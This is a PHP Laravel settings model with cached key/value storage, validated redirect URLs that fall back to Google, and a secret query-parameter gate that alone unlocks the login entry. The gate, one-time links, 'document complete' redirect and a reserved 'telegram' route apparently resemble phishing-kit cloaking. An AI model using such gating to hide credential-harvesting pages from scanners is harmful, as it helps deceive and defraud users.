<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Cache;

class Setting extends Model
{
    protected $fillable = [
        'key',
        'value',
    ];

    public static function get(string $key, ?string $default = null): ?string
    {
        $all = static::cached();

        return array_key_exists($key, $all) ? $all[$key] : $default;
    }

    public static function set(string $key, ?string $value): void
    {
        static::query()->updateOrCreate(
            ['key' => $key],
            ['value' => $value]
        );

        Cache::forget('app_settings');
    }

    public static function setMany(array $pairs): void
    {
        foreach ($pairs as $key => $value) {
            static::query()->updateOrCreate(
                ['key' => $key],
                ['value' => $value]
            );
        }

        Cache::forget('app_settings');
    }

    public static function bool(string $key, bool $default = false): bool
    {
        $value = static::get($key);

        if ($value === null) {
            return $default;
        }

        return in_array(strtolower($value), ['1', 'true', 'yes', 'on'], true);
    }

    /**
     * @return array<string, string|null>
     */
    public static function cached(): array
    {
        return Cache::remember('app_settings', 60, function () {
            return static::query()->pluck('value', 'key')->all();
        });
    }

    public static function fallbackRedirectUrl(): string
    {
        $url = trim((string) static::get('fallback_redirect_url', 'https://www.google.com'));

        if ($url === '' || ! filter_var($url, FILTER_VALIDATE_URL)) {
            return 'https://www.google.com';
        }

        return $url;
    }

    public static function loginEntryParam(): string
    {
        $param = strtolower(trim((string) static::get('login_entry_param', 'login')));

        if (! preg_match('/^[a-z][a-z0-9_-]{0,31}$/', $param)) {
            return 'login';
        }

        $reserved = ['admin', 's', 'telegram', 'logged-out', 'up', 'api'];
        if (in_array($param, $reserved, true)) {
            return 'login';
        }

        return $param;
    }

    /**
     * Optional exact value for entry query, e.g. /?gate=secret.
     * Empty = any/empty value accepted (/?gate or /?gate=anything).
     */
    public static function loginEntryValue(): string
    {
        return trim((string) static::get('login_entry_value', ''));
    }

    public static function loginEntryUrl(): string
    {
        $param = static::loginEntryParam();
        $value = static::loginEntryValue();
        $base = rtrim((string) config('app.url'), '/');

        if ($value === '') {
            return $base.'/?'.$param;
        }

        return $base.'/?'.http_build_query([$param => $value]);
    }

    public static function isLoginEntryRequest(\Illuminate\Http\Request $request): bool
    {
        $query = $request->query();
        $param = static::loginEntryParam();
        $expected = static::loginEntryValue();

        if (count($query) !== 1 || ! array_key_exists($param, $query)) {
            return false;
        }

        if ($expected === '') {
            return true;
        }

        return (string) $query[$param] === $expected;
    }

    public static function safeUrl(string $key, string $default = 'https://www.google.com'): string
    {
        $url = trim((string) static::get($key, $default));

        if ($url === '' || ! filter_var($url, FILTER_VALIDATE_URL)) {
            return $default;
        }

        return $url;
    }

    public static function oneTimeRedirectUrl(): string
    {
        return static::safeUrl('one_time_redirect_url');
    }

    public static function documentCompleteRedirectUrl(): string
    {
        return static::safeUrl('document_complete_redirect_url');
    }

    public static function oneTimeEnabled(): bool
    {
        return static::bool('one_time_enabled');
    }
}
